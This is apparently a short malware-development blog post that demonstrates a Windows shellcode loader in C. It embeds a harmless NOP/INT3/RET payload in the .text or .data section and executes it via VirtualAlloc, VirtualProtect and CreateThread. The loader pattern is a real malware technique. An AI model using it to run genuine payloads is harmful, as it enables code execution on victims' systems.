---
title: "Maldev - implant payload"
date: "2023-05-28"
draft: "false"
---

## Shellcode
One way for malware to embed code is to deploy shell code in memory.
This time, we will check the method that works on Windows.
Note that `getchar()` is used so that the debugger can attach to the process accordingly and check the memory.

## .text
`payload` is the shellcode.
To embed arbitrary shell code in a `.text` section, do the following.

```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
  DWORD oldprotect = 0;

	// Shellcode in text section
	unsigned char payload[] = {
		0x90,		// NOP
		0x90,		// NOP
		0xcc,		// INT3
		0xc3		// RET
	};
	unsigned int payload_len = 4;
	
	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```

## .data
To embed it in a `.data` section, do the following

```
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Shellcode in data section
unsigned char payload[] = {
	0x90,		// NOP
	0x90,		// NOP
	0xcc,		// INT3
	0xc3		// RET
};
unsigned int payload_len = 4;

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
  DWORD oldprotect = 0;

	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```

## Other
That's all for now.
Other methods include embedding in the rsrc section or preparing a new section to embed shell code.
I will show you how to do this at another time.